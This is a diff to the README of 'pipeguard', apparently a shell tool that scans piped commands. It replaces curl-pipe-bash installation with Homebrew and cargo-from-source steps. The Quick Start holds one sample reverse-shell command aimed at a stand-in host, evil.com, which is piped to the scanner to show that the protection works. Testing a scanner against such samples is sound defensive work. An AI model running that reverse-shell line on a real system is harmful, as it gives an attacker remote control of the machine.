@@ -7,11 +7,13 @@
 ## Quick Start
 
 ```bash
-# Install (requires Homebrew)
-curl -fsSL https://raw.githubusercontent.com/SecurityRonin/pipeguard/main/install.sh | bash
+# Install via Homebrew (we practice what we preach — no curl | bash)
+brew tap securityronin/tap
+brew install pipeguard
 
-# Restart your shell or run:
-source ~/.zshrc  # or ~/.bashrc
+# Activate shell protection
+echo 'source $(brew --prefix)/share/pipeguard/shell/init.sh' >> ~/.zshrc
+source ~/.zshrc
 
 # Test protection
 echo 'bash -i >& /dev/tcp/evil.com/4444 0>&1' | pipeguard scan
@@ -128,33 +130,37 @@ User types: curl https://... | bash
 - Homebrew (for YARA library)
 - bash 4+ or zsh
 
-### Install
+### Install via Homebrew (Recommended)
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/SecurityRonin/pipeguard/main/install.sh | bash
+brew tap securityronin/tap
+brew install pipeguard
 ```
 
-The installer:
-1. Installs YARA library via Homebrew
-2. Builds pipeguard binary
-3. Configures shell integration
-4. Creates default config
-
-### Manual Installation
+Then activate shell protection:
 
 ```bash
-# Clone repository
+# For zsh (~/.zshrc):
+echo 'source $(brew --prefix)/share/pipeguard/shell/init.sh' >> ~/.zshrc
+
+# For bash (~/.bashrc):
+echo 'source $(brew --prefix)/share/pipeguard/shell/init.sh' >> ~/.bashrc
+```
+
+### Install from Source
+
+```bash
 git clone https://github.com/SecurityRonin/pipeguard.git
 cd pipeguard
-
-# Run installer
-./install.sh
+cargo install --path .
 ```
 
 ### Uninstall
 
 ```bash
-./install.sh --uninstall
+brew uninstall pipeguard
+brew untap securityronin/tap
+# Remove the source line from your ~/.zshrc or ~/.bashrc
 ```
 
 ---
